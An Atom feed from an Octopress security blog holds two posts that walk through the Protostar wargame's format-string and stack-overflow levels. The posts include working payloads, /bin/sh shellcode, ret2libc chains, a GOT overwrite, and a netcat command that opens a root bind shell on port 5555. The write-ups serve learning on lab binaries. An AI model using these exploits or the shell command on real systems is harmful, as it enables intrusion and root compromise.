<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: protostar | forelsec]]></title>
  <link href="http://hatRiot.github.io/blog/categories/protostar/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2014-09-16T22:47:35-06:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Format String]]></title>
    <link href="http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings/"/>
    <updated>2014-09-16T15:10:04-06:00</updated>
    <id>http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings</id>
    <content type="html"><![CDATA[<p>Wow it&rsquo;s been awhile since I&rsquo;ve taken a look at this box.  The last time I was here, I was working on the format string levels.  These levels have been done and documented to death, but hey, they&rsquo;re fun.  So, without further delay, lets begin.</p>

<p>I&rsquo;ll be assuming you know what a format string is, and if not, you can follow allowing with <a href="http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf">this</a> great paper.</p>

<h2>Format String Level 00</h2>

<p>This level really just points out that vulnerabilities exist in <code>sprintf</code>, and isn&rsquo;t too different from any of the easier stack levels.  All we&rsquo;ve got to do is overwrite an integer on the stack with 0xdeadbeef.  A 64 byte buffer is allocated, our target integer is assigned to 0 (after the allocated buffer), and <code>snprintf</code> invoked.  So 64 bytes of junk followed by 4 bytes should give us&hellip;</p>

<p>```
(gdb) r $(python -c &ldquo;print &lsquo;A&rsquo;<em>64 + &lsquo;\xef\xbe\xad\xde&rsquo;&rdquo;)
Starting program: /opt/protostar/bin/format0 $(python -c &ldquo;print &lsquo;A&rsquo;</em>64 + &lsquo;\xef\xbe\xad\xde&rsquo;&rdquo;)</p>

<p>Breakpoint 1, vuln (string=0xbffff95f &lsquo;A&rsquo; <repeats 64 times>, &ldquo;ﾭ&rdquo;, <incomplete sequence \336>) at format0/format0.c:15
15  in format0/format0.c
(gdb) x/wx &amp;target
0xbffff75c: 0xdeadbeef
(gdb) x/wx &amp;target-4
0xbffff74c: 0x41414141
(gdb) c
Continuing.
you have hit the target correctly :)
```</p>

<h2>Format String Level 01</h2>

<p>Here&rsquo;s the first real format string vulnerability.  In it, <code>printf</code> is called without formatting specifiers, leading to a real format string vulnerability.  Our objective, like before, is to simply overwrite a static target variable, <code>target</code>, with anything.  Due to the variable not being on the local stack frame, we need to overwrite a specific address.  Let&rsquo;s first try and find that variable:</p>

<p><code>
user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target
user@protostar:/opt/protostar/bin$
</code></p>

<p>Note that ASLR/PIE is disabled on the system, so we can safely use this address as our writable target.  Now in order to actually write something to this address, we need to traverse the stack until we reach our controlled data, then use the <code>%n</code> to write the number of bytes written into a pointer found on the stack, our data.  I wrote a little script to help me find the offset:</p>

<p>```
import sys
from commands import getoutput</p>

<p>run = &ldquo;/opt/protostar/bin/format1 $(perl -e &lsquo;print \"AAAAAAAA\&rdquo; . \&ldquo;%08x.\"x{0}&rsquo; . \&rdquo;%x\&ldquo;)&rdquo;</p>

<p>print &lsquo;[!] Searching for offset..&rsquo;
for idx in range(1, 15000):</p>

<pre><code>tmp = getoutput(run.format(idx))
tmps = tmp.split('.')[:-1]
if '41414141' in tmps[len(tmps)-1]:
    print '[!] Format found at offset %d' % idx 
    print '[!] String: %s' % run.format(idx)
    break
</code></pre>

<p>```</p>

<p>We accommodate for misaligned addresses by supplying 8 bytes and searching for 4.  When this runs, we get our offset:</p>

<p><code>
user@protostar:/opt/protostar/bin$ python ~/test.py
[!] Searching for offset..
[!] Format found at offset 133
[!] String: /opt/protostar/bin/format1 $(perl -e 'print "AAAAAAAA" . "%08x."x133' . "%x")
user@protostar:/opt/protostar/bin$
</code></p>

<p>All we need to do is get the alignment right, and we&rsquo;ve got our address:</p>

<p>```
(gdb) r $(perl -e &lsquo;print &ldquo;\x38\x96\x04\x08BAAAA&rdquo; . &ldquo;%08x."x132 . &rdquo;%n"&rsquo;)
[snip]
Breakpoint 1, vuln (</p>

<pre><code>                string=0xbffff704 "8\226\004\bBAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%"...) at format1/format1.c:12
</code></pre>

<p>12  format1/format1.c: No such file or directory.</p>

<pre><code>in format1/format1.c
(gdb) x/wx &amp;target
0x8049638 &lt;target&gt;: 0x000004ad
(gdb) c
Continuing.
1.0000000f.bffff6db.00000000.00000000.d2000000.3398faa1.0022db30.da5bc6eb.6944a17d.00363836.00000000.00000000.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.00317461.you have modified the target :)
</code></pre>

<p>```</p>

<p>Note we replace the <code>%x</code> at the end with a <code>%n</code>, thus allowing us to write bytes into the specified address.</p>

<h2>Format String Level 02</h2>

<p>The learning curve after level 1 is much lower for the remaining two levels.  This level is identical to 1, except we need to actually write a specific value (0x64).  Let&rsquo;s begin by first finding our target address:</p>

<p><code>
$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target
</code></p>

<p>Modifying my script a bit (since input is now via fgets):</p>

<p><code>
$ python /home/user/test.py
[!] Searching for offset..
[!] Format found at offset 4
[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format2
</code></p>

<p>Not so far up the stack this time.  Lets plug in our address:</p>

<p><code>
$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%x."x3 . "%n"') | /opt/protostar/bin/format2
��200.b7fd8420.bffff604.
target is 26 :(
</code></p>

<p>Not quite there.  Recall that we&rsquo;re writing the number of bytes printed; so we just need to jack up our output formatter, and&hellip;</p>

<p><code>
$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%19x."x3 . "%n"') | /opt/protostar/bin/format2
��                200.           b7fd8420.           bffff604.
you have modified the target :)
</code></p>

<h2>Format String Level 03</h2>

<p>This level requires us to more accurately write specific data to an address; lets again find our target:</p>

<p><code>
$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
</code></p>

<p>And again running our script:</p>

<p><code>
$ python /home/user/test.py
[!] Searching for offset..
[!] Format found at offset 12
[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x12' . "%x") | /opt/protostar/bin/format3
</code></p>

<p>And if we test this out:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08" + "%x."*11 + "%n"' | /opt/protostar/bin/format3
��0.bffff5c0.b7fd7ff4.0.0.bffff7c8.804849d.bffff5c0.200.b7fd8420.bffff604.
target is 0000004c :(
</code></p>

<p>So we&rsquo;ve validated we can modify the target, but we need to modify all 4 bytes.  At this point, I discovered that we could simply continue to add on data to the value, pop out, and write another byte.  This, however, was tedious, and filled up my command line quickly.  It was at this point that I switched to using direct parameter access symbols.  Essentially, this allows us to directly access a variable from the stack, without having to continually pop values from it.  For example, if we wanted to access the 11th parameter, we would simply use <code>%11$x</code>.  If we return briefly to format1, we can see this in action below:</p>

<p><code>
$ ./format1 $(perl -e 'print "AAAAAA"')'_%128$x';printf "\n"
AAAAAA_41414141
</code></p>

<p>This is a much cleaner way of reading values off the stack.  Testing this on level 3:</p>

<p><code>
$ python -c 'print "AAAABBBBCCCCDDDD" + "_%12$x_%13$x_%14$x_%15$x"' | ./format3
AAAABBBBCCCCDDDD_41414141_42424242_43434343_44444444
target is 00000000 :(
</code></p>

<p>And to verify we&rsquo;re there, we can substitute the characters for addresses, and replace the <code>$x</code> with a <code>$n</code> to write into those addresses:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%12$n%13$n%14$n%15$n"' | ./format3
��������
target is 10101010 :(
</code></p>

<p>Figuring out the correct padding values requires some simple math:</p>

<p><code>
first byte = 0x44 - 0x10
second     = 0x55 - 0x44
third      = 0x02 - 0x55
</code></p>

<p>Note we&rsquo;ve left off the fourth byte, we&rsquo;ll return to this in a second.  Simple math tells us that the first byte padding value should be 52:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%13$x%14$x%15$x"' | ./format3
��������                                                   080496f580496f680496f7
target is 00000044 :(
</code></p>

<p>The second byte is 17, and the third byte is -83, but if we wrap that we get 173 (0x02 &ndash; 0x55 &amp; 0xff).  This results in:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%17u%13$n%173u%14$n%15$x"' | ./format3
��������                                                   0       3221222896                                                                                                                                                                   308684389280496f7
you have modified the target :)
</code></p>

<p>As noted earlier, we don&rsquo;t actually have to write anything to the final byte, as it is set due to a previous overflow.</p>

<h2>Format String Level 04</h2>

<p>The final level in the format string section, this one requires us to redirect execution to another method, <code>hello</code>.  This probably means we&rsquo;ll need to overwrite a value in the GOT, or the Global Offset Table, which acts as a trampoline for dynamic libraries.  Let&rsquo;s start by finding the hello function that we want to redirect execution flow to:</p>

<p><code>
$ objdump -M intel -t format4 | grep hello
080484b4 g     F .text  0000001e              hello
</code></p>

<p>And running our script:</p>

<p><code>
$ python /home/user/test.py
[!] Searching for offset..
[!] Format found at offset 4
[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format4
</code></p>

<p>If we take a look at the <a href="http://webcache.googleusercontent.com/search?q=cache:KFYMJlYdHdMJ:exploit-exercises.com/protostar/format4+&amp;cd=3&amp;hl=en&amp;ct=clnk&amp;gl=us">code</a>, we see a call to exit right after the vulnerable printf.  This is the entry we want to overwrite.  We now need that address:</p>

<p><code>
$ objdump --dynamic-reloc format4 | grep exit
08049718 R_386_JUMP_SLOT   _exit
08049724 R_386_JUMP_SLOT   exit
</code></p>

<p>So we need to overwrite 0x08049724 with 0x080484b4.  Let&rsquo;s give this a shot:</p>

<p>```
user@protostar:/opt/protostar/bin$ python -c &lsquo;print &ldquo;\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08&rdquo; + &ldquo;%4$n%5$n%6$n%7$n&rdquo;&rsquo; > /tmp/input
user@protostar:/opt/protostar/bin$ gdb -q ./format4
Reading symbols from /opt/protostar/bin/format4&hellip;done.
(gdb) r &lt; /tmp/input
Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
$�%�&amp;�'�</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x10101010 in ?? ()
(gdb)
```</p>

<p>We&rsquo;ve verified we&rsquo;re at the right location and can control EIP; notice, however, that the two addresses only differ by 2 bytes.  If we use the <code>$hn</code>, or a short 2 byte write, we can get by with less code:</p>

<p>```
user@protostar:/opt/protostar/bin$ python -c &lsquo;print &ldquo;\x24\x97\x04\x08&rdquo; + &ldquo;%4$hn&rdquo;&rsquo; > /tmp/input
user@protostar:/opt/protostar/bin$ gdb -q ./format4
Reading symbols from /opt/protostar/bin/format4&hellip;done.
(gdb) r &lt; /tmp/input
Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
$�</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x08040004 in ?? ()
```</p>

<p>More simple math, <code>p/d 0x84b4 - 0x0004</code>, gives us 33968.</p>

<p><code>
$ python -c 'print "\x24\x97\x04\x08" + "%33968u%4$hn"' | ./format4
[snip whitespace]
code execution redirected! you win
</code></p>

<p>And that&rsquo;s it!  Next up, heap exploitation.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Stack Levels]]></title>
    <link href="http://hatRiot.github.io/blog/2013/03/31/protostar-solutions-stack-levels/"/>
    <updated>2013-03-31T00:21:16-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/03/31/protostar-solutions-stack-levels</id>
    <content type="html"><![CDATA[<p>Part two of the three <a href="http://exploit-exercises.com/">exploit exercises</a> available.  This set of challenges focused purely on memory corruption via stack overflows; the challenges here weren&rsquo;t too difficult, but I wanted to work through them anyway.  A post with the remaining levels will follow.</p>

<h3>Stack Level 00</h3>


<p>Introductory level that introduces stack layout; here, the <code>modified</code> variable follows a 64 byte array on the stack.  If the stack is overwritten, the modified variable will be run over.</p>

<p><code>
user@protostar:~$ python -c "print 'A'*70" | ./stack0
you have changed the 'modified' variable
user@protostar:~$
</code></p>

<h3>Stack Level 01</h3>


<p>Another introductory level that forces you to overwrite a particular variable with a specific value.  Essentially we need to take level 00 and figure out exactly where to overwrite the modified variable.  This can be trivially guessed, considering we know the buf size.  Remembering that this architecture is little endian:</p>

<p><code>
user@protostar:~$ ./stack1 $(perl -e 'print "A"x64 . "dcba"')
you have correctly got the variable to the right value
user@protostar:~$
</code></p>

<p>It&rsquo;s also worth noting that, if you&rsquo;re loading this into gdb, the modified variable is volatile, so if you <code>p &amp;modified</code> and don&rsquo;t get the right value, don&rsquo;t worry.  You&rsquo;re not crazy.</p>

<h3>Stack Level 02</h3>


<p>Almost a carbon copy of level 1, except this time our input vector is an environmental variable.</p>

<p><code>
user@protostar:~$ export GREENIE=$(perl -e 'print "A"x64 . "\x0a\x0d\x0a\x0d"')
user@protostar:~$ ./stack2
you have correctly modified the variable
</code></p>

<h3>Stack Level 03</h3>


<p>This level has us redirecting code flow to another function present in the source.  The buffer length is the same as the previous three, so we just need to find out where the function lies.</p>

<p><code>
user@protostar:~$ objdump -d stack3 | grep win
08048424 &lt;win&gt;:
user@protostar:~$ echo $(perl -e 'print "A"x64 . "\x24\x84\x04\x08"') | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:~$
</code></p>

<h3>Stack Level 04</h3>


<p>Instead of overwriting a function call, we&rsquo;ll be overwriting a return address.  When the function exits, it pops the current stack frame off and returns the saved frame pointer, so we need only overflow the address immediately following EBP.</p>

<p><code>
user@protostar:~$ objdump -d stack4 | grep win
080483f4 &lt;win&gt;:
user@protostar:~$ perl -e 'print "A"x76 . "\xf4\x83\x04\x08"' | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:~$
</code></p>

<h3>Stack Level 05</h3>


<p>There&rsquo;s no real flag here aside from getting a shell, so we&rsquo;ll need some shellcode now.  Disclaimer: I spent a good deal of time trying to get shellcode working for this, and would continually brick wall at the same spot:</p>

<p>```
(gdb) ni
Executing new program: /bin/dash
Error in re-setting breakpoint 1: Function &ldquo;main&rdquo; not defined.</p>

<p>Program exited normally.
(gdb)
```</p>

<p>During one of my googling escapades, I haphazardly clicked <a href="http://www.mattandreko.com/2011/12/exploit-exercises-protostar-stack-5.html">this</a> link from someone having the exact same issues with this level.  What should be a very simple buffer overflow turned into a very wonky, absurd tumble through some obscure shellcode issues.  In the end, I came up with this solution:</p>

<p>```
user@protostar:/opt/protostar/bin$ perl -e &lsquo;print &ldquo;A"x76 . &rdquo;\x80\xf7\xff\xbf" . &ldquo;\x90"x9 . &rdquo;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"&rsquo; | ./stack5</p>

<h1>whoami</h1>

<p>root
#
```</p>

<h3>Stack Level 06</h3>


<p>This level forces us to place our shellcode in a specific path; i.e. out of userland.  We can&rsquo;t just stick it onto the stack, and we can&rsquo;t place it in an environmental variable.  Instead, we must use ret2[libc|strcpy|gets|etc] or ROP.  It verifies the function&rsquo;s return address by calling <code>__built_return_address(0)</code>, which will return the current function&rsquo;s return address.</p>

<p>This one was pretty fun, as I was able to leverage the ret2libc to pull it off.  I used c0ntext&rsquo;s <a href="http://css.csail.mit.edu/6.858/2012/readings/return-to-libc.pdf">ret2libc</a> demonstration paper as reference.  I based most of my work off the previous level, and modified it only by adding system() and exit() addresses.  My payload in the end looked like this:</p>

<p><code>[80 bytes junk | system() address | exit() address | command]</code></p>

<p>For this example, I have my command stashed in the GETME environmental variable:</p>

<p><code>
user@protostar:/opt/protostar/bin$ export GETME=/bin/sh
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x86\xff\xff\xbf";' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췆���
user@protostar:/opt/protostar/bin$ export GETME=/usr/bin/whoami
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x80\xff\xff\xbf";' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췀���
root
user@protostar:/opt/protostar/bin$
</code></p>

<p>I wasn&rsquo;t able to get /bin/sh launched with a system() call, and after checking the man page, it appears that system drops root privileges.  My second thought was to simply open up a reverse shell:</p>

<p><code>
user@protostar:/opt/protostar/bin$ export GETME="/bin/nc -l -p 5555 -e /bin/sh"
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x72\xff\xff\xbf";' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`��r���
</code></p>

<p>I now had a root shell listening on port 5555.</p>

<h3>Stack Level 07</h3>


<p>The final stack level is almost exactly like the previous level, however this time when it returns from getpath(), it returns strdup(buffer), which returns a pointer to a duplicate string of buffer.  The address range is also now much more restrictive; disabling any address matching 0xb0000000.  The exploit page notes that we should be thinking about a ret2text to exploit this, so I started thinking of ways to ret2plt or ret2dl-resolve, but in the end decided those were likely too advanced for such a simple level.  Instead, I objdump&rsquo;d the binary in search of a POP POP RET, which would bypass the addressing filter and allow me to take control over EIP.  The first one I found was at <code>0x8048492</code>.  After some twiddling, I discovered the following would lead me to code execution: <code>perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8' . "\xcc"x16 | ./stack7</code>.  So the payload will look like this <code>[80 bytes junk | POP POP RET | 8 bytes junk | shellcode]</code></p>

<p>I dumped the shellcode from level 5 into this, but for some reason the shell would only spawn if running in gdb:</p>

<p>```
user@protostar:/opt/protostar/bin$ perl -e &lsquo;print &ldquo;A"x80 . &rdquo;\x92\x84\x04\x08" . &ldquo;\x90"x8 . &rdquo;\xac\xf7\xff\xbf" . &ldquo;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&rdquo;&rsquo; > /tmp/input
user@protostar:/opt/protostar/bin$ gdb ./stack7
Reading symbols from /opt/protostar/bin/stack7&hellip;done.
(gdb) r &lt; /tmp/input
Starting program: /opt/protostar/bin/stack7 &lt; /tmp/input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��������������1�1۰ ̀Sh/ttyh/dev��1�f� &lsquo;�̀1�Ph//shh/bin��PS�ᙰ</p>

<p>Executing new program: /bin/dash
$ exit
user@protostar:/opt/protostar/bin$ ./stack7 &lt; /tmp/input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��������������1�1۰ ̀Sh/ttyh/dev��1�f� &lsquo;�̀1�Ph//shh/bin��PS�ᙰ</p>

<p>Segmentation fault
user@protostar:/opt/protostar/bin$
```</p>

<p>Where <code>\xac\xf7\xff\xbf</code> is the address of shellcode.  Instead I threw shellcode into an environmental variable and leveraged Jon Ericson&rsquo;s getenvaddr application to find the offset:</p>

<p><code>``
user@protostar:/opt/protostar/bin$ export GETME=</code>perl -e &lsquo;print &ldquo;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&rdquo;&rsquo;`
user@protostar:/opt/protostar/bin$ /tmp/test GETME ./stack7
GETME will be at 0xbfffff58
user@protostar:/opt/protostar/bin$ perl -e &lsquo;print &ldquo;A"x80 . &rdquo;\x92\x84\x04\x08" . &ldquo;\x90"x8 . &rdquo;\x58\xff\xff\xbf"&rsquo; > /tmp/input
user@protostar:/opt/protostar/bin$ ./stack7 &lt; /tmp/input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA����������X���</p>

<h1>whoami</h1>

<p>root</p>

<h1></h1>

<p>```</p>

<p>Overall these levels were pretty basic, but I&rsquo;m looking forward to digging into Fusion for more advanced flags.</p>
]]></content>
  </entry>
  
</feed>
